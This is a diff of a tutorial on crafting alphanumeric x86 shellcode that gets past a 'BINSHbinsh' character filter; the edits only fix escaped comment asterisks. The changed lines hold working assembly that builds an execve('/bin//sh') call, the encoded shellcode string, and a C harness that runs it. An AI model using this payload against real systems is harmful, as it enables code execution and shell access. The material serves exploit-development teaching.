@@ -38,7 +38,7 @@ code and the code below may look alike:
 
     int main(void) {
         char shellcode[];
-        char \*invalid = "BINSHbinsh";
+        char *invalid = "BINSHbinsh";
         int i = 0;
 
         scanf("%s", shellcode);
@@ -73,7 +73,7 @@ just pushed.
 
 .. code-block:: nasm
 
-                /* test.s \*/
+                /* test.s */
             .intel_syntax noprefix
             .globl _start
     _start:
@@ -238,11 +238,11 @@ And the result is:
 
 .. code-block:: nasm
 
-            /* alnum.s \*/
+            /* alnum.s */
             .intel_syntax noprefix
             .globl _start
     _start:
-            /* set buffer register to ecx \*/
+            /* set buffer register to ecx */
             push eax
             pop ecx
 
@@ -250,22 +250,22 @@ And the result is:
             push 0x30
             pop eax
             xor al, 0x30
-                      /* omit eax, ecx \*/
-            push eax  /* edx = 0 \*/
-            push eax  /* ebx = 0 \*/
+                      /* omit eax, ecx */
+            push eax  /* edx = 0 */
+            push eax  /* ebx = 0 */
             push eax
             push eax
-            push eax  /* esi = 0 \*/
-            push ecx  /* edi = buffer \*/
+            push eax  /* esi = 0 */
+            push ecx  /* edi = buffer */
             popad
-            dec edx   /* edx = 0xffffffff \*/
+            dec edx   /* edx = 0xffffffff */
 
     patch_ret:
-            /* garbage \*/
+            /* garbage */
             push eax
             xor eax, 0x30303030
 
-            /* 0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) \*/
+            /* 0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) */
             push edx
             pop eax
             xor al, 0x44
@@ -274,7 +274,7 @@ And the result is:
             xor [edi+2*ecx+0x30], al
 
     build_stack:
-            /* push 0x80cd0b42 \*/
+            /* push 0x80cd0b42 */
             push esi
             pop eax
             xor eax, 0x30433230
@@ -288,7 +288,7 @@ And the result is:
             inc ecx
             xor [ecx], dh
 
-            /* push 0x8de18953 \*/
+            /* push 0x8de18953 */
             push esi
             pop eax
             xor eax, 0x31443030
@@ -303,7 +303,7 @@ And the result is:
             inc ecx
             xor [ecx], dh
 
-            /* push 0x52e3896e \*/
+            /* push 0x52e3896e */
             push esi
             pop eax
             xor eax, 0x31443034
@@ -316,21 +316,21 @@ And the result is:
             inc ecx
             xor [ecx], dh
 
-            /* push 0x69622f68 \*/
+            /* push 0x69622f68 */
             push esi
             pop eax
             xor eax, 0x30304330
             xor eax, 0x59526c58
             push eax
 
-            /* push 0x68732f2f \*/
+            /* push 0x68732f2f */
             push esi
             pop eax
             xor eax, 0x30304343
             xor eax, 0x58436c6c
             push eax
 
-            /* push 0x6852d231 \*/
+            /* push 0x6852d231 */
             push esi
             pop eax
             xor eax, 0x30314141
@@ -375,7 +375,8 @@ Using the following command to check whether the alpanumeric shellcode contains
 
 .. code-block:: bash
 
-    $ echo 'PYj0X40PPPPPQaJP50000RX4Dj0Y0DO0VX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx' | grep [BINSHbinsh]
+    $ echo \
+    'PYj0X40PPPPPQaJP50000RX4Dj0Y0DO0VX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx' | grep [BINSHbinsh]
 
 Nothing showed up! That means there is no character of "BINSHbinsh".  And the
 alphanumeric shellcode is only 151 characters long. So let's put the shellcode
@@ -383,13 +384,13 @@ into our simple shellcode executor:
 
 .. code-block:: c
 
-    /* shellcode.c \*/
+    /* shellcode.c */
 
     int main(void)
     {
         char shellcode[] = "PYj0X40PPPPPQaJPXPXPX50000500005000050000RX4Dj0Y0DODVX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx";
 
-        (\*(void (\*)())shellcode)();
+        (*(void (*)())shellcode)();
     }
 
 Do not forget we are on 32-bit machine and the shellcode is stored in the
